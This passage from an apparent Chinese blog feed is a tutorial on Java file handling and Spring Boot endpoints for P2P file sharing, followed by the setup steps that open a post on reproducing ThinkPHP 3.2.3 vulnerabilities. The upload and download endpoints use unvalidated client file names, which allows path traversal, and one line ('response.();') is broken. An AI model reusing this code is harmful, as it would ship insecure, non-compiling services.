class="comment">// 规范化路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">normalizedPath</span> <span class="operator">=</span> path.normalize();</span><br><span class="line">        System.out.println(<span class="string">&quot;Normalized path: &quot;</span> + normalizedPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换为绝对路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">absolutePath</span> <span class="operator">=</span> path.toAbsolutePath();</span><br><span class="line">        System.out.println(<span class="string">&quot;Absolute path: &quot;</span> + absolutePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//转换为File对象</span></span><br><span class="line">        java.io.<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> path.toFile();</span><br><span class="line">        System.out.println(<span class="string">&quot;File object: &quot;</span> + file);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果如下（这里需要注意解析相对路径是解析父路径）</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240921170731983.png"></p>
<h3 id="3-File类简介"><a href="#3-File类简介" class="headerlink" title="3. File类简介"></a>3. File类简介</h3><p><code>java.io.File</code> 类在Java中用于表示文件系统中的文件和目录。它提供了一组方法来创建、删除、重命名文件或目录，以及获取文件的各种属性，如文件大小、最后修改时间等。注意：File类只能操作文件或文件夹本身，不能读写文件里面的数据。</p>
<p>主要特点</p>
<ol>
<li><strong>文件和目录操作</strong>：</li>
</ol>
<ul>
<li><code>File</code> 类提供了创建、删除、重命名文件或目录的方法。</li>
<li>可以检查文件是否存在、是否为目录或文件等。</li>
</ul>
<ol start="2">
<li><strong>文件属性</strong>：</li>
</ol>
<ul>
<li>可以获取文件的路径、名称、大小、最后修改时间等属性。</li>
</ul>
<ol start="3">
<li><strong>文件列表</strong>：</li>
</ol>
<ul>
<li>可以列出目录中的文件和子目录。</li>
</ul>
<p>创建FileExample类，测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">//创建File对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\idea_project\\test_p2p\\test\\hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出文件信息</span></span><br><span class="line">        System.out.println(<span class="string">&quot;File exists: &quot;</span> + file.exists());</span><br><span class="line">        System.out.println(<span class="string">&quot;Is directory: &quot;</span> + file.isDirectory());</span><br><span class="line">        System.out.println(<span class="string">&quot;Is file: &quot;</span> + file.isFile());</span><br><span class="line">        System.out.println(<span class="string">&quot;Path: &quot;</span> + file.getPath());</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + file.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Parent: &quot;</span> + file.getParent());</span><br><span class="line">        System.out.println(<span class="string">&quot;Absolute path: &quot;</span> + file.getAbsolutePath());</span><br><span class="line">        System.out.println(<span class="string">&quot;Length: &quot;</span> + file.length());</span><br><span class="line">        System.out.println(<span class="string">&quot;Last modified: &quot;</span> + file.lastModified());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建文件或者目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">newDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\idea_project\\test_p2p\\test&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">dirCreated</span> <span class="operator">=</span> newDir.mkdir();</span><br><span class="line">        System.out.println(<span class="string">&quot;Created new directory: &quot;</span> + dirCreated);</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">newFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\idea_project\\test_p2p\\test\\hello.txt&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">created</span> <span class="operator">=</span> newFile.createNewFile();</span><br><span class="line">        System.out.println(<span class="string">&quot;Create new file: &quot;</span> + created);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 列出目录中的文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\idea_project\\test_p2p\\test&quot;</span>);</span><br><span class="line">        String[] files = dir.list();</span><br><span class="line">        <span class="keyword">for</span> (String fileName : files) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;File in directory: &quot;</span> + fileName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-InputStream和OutPutStream流简介"><a href="#4-InputStream和OutPutStream流简介" class="headerlink" title="4. InputStream和OutPutStream流简介"></a>4. InputStream和OutPutStream流简介</h3><p>在Java中，<code>InputStream</code> 和 <code>OutputStream</code> 是Java标准库中用于处理字节流的基本类。它们分别用于读取和写入字节数据。这两个类及其子类构成了Java中处理文件和其他字节流的基础。</p>
<p><code>InputStream</code> 是一个抽象类，用于从源读取字节数据。所有的字节输入流都继承自 <code>InputStream</code>。常见的 <code>InputStream</code> 子类包括：</p>
<ul>
<li><strong>FileInputStream</strong>：从文件系统中的文件读取字节。</li>
<li><strong>ByteArrayInputStream</strong>：从字节数组读取字节。</li>
<li><strong>ObjectInputStream</strong>：用于反序列化对象。</li>
<li><strong>BufferedInputStream</strong>：为其他输入流添加缓冲功能，提高读取效率。</li>
<li><strong>PipedInputStream</strong>：用于线程间的通信，与 <code>PipedOutputStream</code> 配合使用。</li>
</ul>
<p><code>OutputStream</code> 同样是一个抽象类，用于向目的地写入字节数据。所有的字节输出流都继承自 <code>OutputStream</code>。常见的 <code>OutputStream</code> 子类包括：</p>
<ul>
<li><strong>FileOutputStream</strong>：向文件系统中的文件写入字节。</li>
<li><strong>ByteArrayOutputStream</strong>：向字节数组写入字节。</li>
<li><strong>ObjectOutputStream</strong>：用于序列化对象。</li>
<li><strong>BufferedOutputStream</strong>：为其他输出流添加缓冲功能，提高写入效率。</li>
<li><strong>PipedOutputStream</strong>：用于线程间的通信，与 <code>PipedInputStream</code> 配合使用。</li>
</ul>
<h4 id="5-在TestController里编写main方法"><a href="#5-在TestController里编写main方法" class="headerlink" title="5. 在TestController里编写main方法"></a>5. 在TestController里编写main方法</h4><ul>
<li><strong>FileInputStream</strong>：用于从文件系统中的一个文件读取字节。它打开一个从文件系统中的指定文件到应用程序的输入字节流。</li>
<li><strong>FileOutputStream</strong>：用于将数据写入文件系统中的文件。它创建一个向文件系统中的指定文件提供输出的文件输出流。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceFilePath</span> <span class="operator">=</span> <span class="string">&quot;D:\\idea_project\\test_p2p\\test\\hello.txt&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">destinationFolderPath</span> <span class="operator">=</span> <span class="string">&quot;D:\\idea_project\\test_p2p\\test1\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(sourceFilePath);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">destFolderPath</span> <span class="operator">=</span> Paths.get(destinationFolderPath);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">destFilePath</span> <span class="operator">=</span> destFolderPath.resolve(sourcePath.getFileName());</span><br><span class="line"></span><br><span class="line">        copyFileToFolder(sourcePath,destFilePath);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">copyFileToFolder</span><span class="params">(Path sourcePath, Path destFilePath)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="comment">// 检查源文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(sourcePath)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;源文件不存在: &quot;</span> + sourcePath);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查目标文件夹是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (!Files.isDirectory(destFilePath.getParent())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;目标文件不存在： &quot;</span> + destFilePath.getParent());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourcePath.toFile());</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destFilePath.toFile())</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="comment">// 创建一个字节数组来存储文件内容</span></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>]; <span class="comment">// 使用较大的缓冲区</span></span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环读取文件内容直到读完</span></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 写入到目标文件</span></span><br><span class="line">                fos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240923204329970.png"></p>
<h2 id="使用springboot框架实现P2P节点的ip发现"><a href="#使用springboot框架实现P2P节点的ip发现" class="headerlink" title="使用springboot框架实现P2P节点的ip发现"></a>使用springboot框架实现P2P节点的ip发现</h2><p>使用的是gitee上的项目，地址：<code>https://gitee.com/daitoulin/p2p_bootstrap.git</code></p>
<p>打开终端克隆一下</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240923204624119.png"></p>
<p>先<code>ipconfig</code>查看下本机ip，然后打开application.properties进行配置引导节点ip</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240923204951226.png"></p>
<p>尝试运行发现java8的版本不行</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240930202548483.png"></p>
<p>打开项目结构，下载java新一点的版本然后使用</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240930202622594.png"></p>
<p>成功运行</p>
<p><img src="/article/P2P%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/image-20240930202726252.png"></p>
<h2 id="使用springboot框架完成两个节点内的文件传输"><a href="#使用springboot框架完成两个节点内的文件传输" class="headerlink" title="使用springboot框架完成两个节点内的文件传输"></a>使用springboot框架完成两个节点内的文件传输</h2><h3 id="相关注解"><a href="#相关注解" class="headerlink" title="相关注解"></a>相关注解</h3><h4 id="1-RequestParam"><a href="#1-RequestParam" class="headerlink" title="1. @RequestParam"></a>1. @RequestParam</h4><p>将参数跟随在url的问号后面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testParam&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">testParam</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line"></span><br><span class="line">    json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">    json.setMsg(<span class="string">&quot;用户名为：&quot;</span> + username);</span><br><span class="line">    json.setContent(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-RequestBody"><a href="#2-RequestBody" class="headerlink" title="2. @RequestBody"></a>2. @RequestBody</h4><p>将参数转为json放在请求体中</p>
<h4 id="3-PathVariable"><a href="#3-PathVariable" class="headerlink" title="3. @PathVariable"></a>3. @PathVariable</h4><p>&#x2F;test&#x2F;{username}，绑定最后一个斜杆后面的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testPathVariable/&#123;username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">testPathVariable</span><span class="params">(<span class="meta">@PathVariable(&quot;username&quot;)</span> String username)</span>&#123;</span><br><span class="line">        <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line"></span><br><span class="line">        json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">        json.setMsg(<span class="string">&quot;用户名为：&quot;</span> + username);</span><br><span class="line">        json.setContent(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-不加任何注解的"><a href="#4-不加任何注解的" class="headerlink" title="4. 不加任何注解的"></a>4. 不加任何注解的</h4><p>将自动转为java实体类，一般前端以form-data形式传递</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/uploadFile&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">testUpload</span><span class="params">(MultipartFile multipartFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multipartFile.getOriginalFilename();</span><br><span class="line">        <span class="type">Path</span> <span class="variable">targetLocation</span> <span class="operator">=</span> Paths.get(shareFilePath, fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存文件到指定位置</span></span><br><span class="line">        multipartFile.transferTo(targetLocation);</span><br><span class="line">        json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">        json.setMsg(<span class="string">&quot;查询成功&quot;</span>);</span><br><span class="line">        json.setContent(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="查询指定文件夹下的文件名"><a href="#查询指定文件夹下的文件名" class="headerlink" title="查询指定文件夹下的文件名"></a>查询指定文件夹下的文件名</h3><p>思路：创建File类，用循环将所有文件名找出并返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/findDocument&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">findDocument</span><span class="params">(<span class="meta">@RequestBody</span> QueryDocument qd)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qd.getIp() == <span class="literal">null</span>) &#123;</span><br><span class="line">        json.setCode(<span class="string">&quot;401&quot;</span>);</span><br><span class="line">        json.setMsg(<span class="string">&quot;ip为空无法查找&quot;</span>);</span><br><span class="line">        json.setContent(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; listFiles = listFiles(shareFilePath);</span><br><span class="line">    <span class="type">DocumentInfo</span> <span class="variable">documentInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DocumentInfo</span>();</span><br><span class="line">    documentInfo.setFileNames(listFiles);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">contentJson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(documentInfo);</span><br><span class="line"></span><br><span class="line">    json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">    json.setMsg(<span class="string">&quot;查询成功&quot;</span>);</span><br><span class="line">    json.setContent(contentJson);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List&lt;String&gt; <span class="title function_">listFiles</span><span class="params">(String directoryPath)</span> &#123;</span><br><span class="line"><span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(directoryPath);</span><br><span class="line">List&lt;String&gt; fileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">if</span> (directory.isDirectory()) &#123;</span><br><span class="line">    File[] files = directory.listFiles();</span><br><span class="line">    <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (File file : files) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">                System.out.println(file.getName());</span><br><span class="line">                fileNames.add(file.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;指定路径不是文件夹。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fileNames;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查询所有注册的ip"><a href="#查询所有注册的ip" class="headerlink" title="查询所有注册的ip"></a>查询所有注册的ip</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/selectIp&quot;)</span></span><br><span class="line">    <span class="meta">@CrossOrigin</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">selectIp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line">        NettyKademliaDHTNode&lt;String, String&gt; node = tesst.getNode();</span><br><span class="line">        RoutingTable&lt;BigInteger, NettyConnectionInfo, Bucket&lt;BigInteger, NettyConnectionInfo&gt;&gt; routingTable = node.getRoutingTable();</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; ipList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ipList.add(nodeIp);</span><br><span class="line">        <span class="keyword">for</span> (Bucket&lt;BigInteger, NettyConnectionInfo&gt; bucket : routingTable.getBuckets()) &#123;</span><br><span class="line">            System.out.println(bucket);</span><br><span class="line">            List&lt;BigInteger&gt; nodeIds = bucket.getNodeIds();</span><br><span class="line">            <span class="keyword">if</span> (nodeIds.size() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (BigInteger nodeId : nodeIds) &#123;</span><br><span class="line">                    ExternalNode&lt;BigInteger, NettyConnectionInfo&gt; nodeInfo = bucket.getNode(nodeId);</span><br><span class="line">                    <span class="comment">//System.out.println(nodeInfo);</span></span><br><span class="line">                    <span class="type">NettyConnectionInfo</span> <span class="variable">connectionInfo</span> <span class="operator">=</span> nodeInfo.getConnectionInfo();</span><br><span class="line">                    <span class="comment">//System.out.println(connectionInfo);</span></span><br><span class="line">                    <span class="keyword">if</span> (connectionInfo.getHost().equals(nodeIp)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ipList.add(connectionInfo.getHost());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">        json.setMsg(<span class="string">&quot;查询成功&quot;</span>);</span><br><span class="line">        json.setContent(ipList);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><p>将前端传输的文件名进行拼接，对指定的ip进行请求，收到返回的byte数组，存入本地指定目录</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/downloadFile&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONResult&gt; <span class="title function_">downloadFile</span><span class="params">(<span class="meta">@RequestBody</span> DownloadInfo dI)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONResult</span> <span class="variable">json</span> <span class="operator">=</span> JSONResult.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + dI.getIp() + <span class="string">&quot;:8888/download/&quot;</span>+ dI.getFileName();</span><br><span class="line"></span><br><span class="line">        ResponseEntity&lt;<span class="type">byte</span>[]&gt; response = restTemplate.getForEntity(url, <span class="type">byte</span>[].class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (response.getStatusCode().is2xxSuccessful()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] fileContent = response.();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建 ByteArrayInputStream</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(fileContent);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存文件到本地</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">localFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(shareFilePath, <span class="string">&quot;received_&quot;</span> + System.currentTimeMillis() + <span class="string">&quot;_&quot;</span> + dI.getFileName());</span><br><span class="line"></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(localFile);</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            json.setCode(<span class="string">&quot;200&quot;</span>);</span><br><span class="line">            json.setMsg(<span class="string">&quot;保存成功&quot;</span>);</span><br><span class="line">            json.setContent(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            json.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            json.setMsg(<span class="string">&quot;保存失败&quot;</span>);</span><br><span class="line">            json.setContent(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONResult&gt;(json, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目标机器将指定的文件读取转为byte数组并返回</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/download/&#123;fileName&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;<span class="type">byte</span>[]&gt; download(<span class="meta">@PathVariable</span> String fileName) &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(shareFilePath + fileName);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] fileContent = Files.readAllBytes(path);</span><br><span class="line">            <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">            headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok().headers(headers).body(fileContent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.notFound().build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>ThinkPHP3漏洞探索</title>
    <url>/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>趁热打铁，把ThinkPHP3的相关漏洞都复现一下</p>
<span id="more"></span>

<h1 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a>ThinkPHP3</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>PHP5.5.9+ThinkPHP3.2.3</p>
</blockquote>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>源码下载链接：<a href="http://m.lxywzjs.com/wap/article/index/artid/199.html">http://m.lxywzjs.com/wap/article/index/artid/199.html</a></p>
<p>打开phpstudy，新建一个网站</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240723165905216.png"></p>
<p>将源码文件解压放到thinkphp3的文件夹内即可</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>像方法一那样打开phpstudy，新建一个网站</p>
<p>创建好网站后先下载下composer工具，可以从<code>软件管理 =&gt; composer</code>处下载</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618225035184.png"></p>
<p>下载好后在管理打开composer</p>
<p>选择php版本为大于5.3的</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120429200.png"></p>
<p>然后执行命令安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/thinkphp:v3.2.3 tp3</span><br></pre></td></tr></table></figure>

<p>安装成功后将tp3文件夹内的所有文件移到根目录<code>thinkphp3</code>下</p>
<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719120752776.png"></p>
<p>最后在刚刚执行composer命令的终端更新一下即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure>

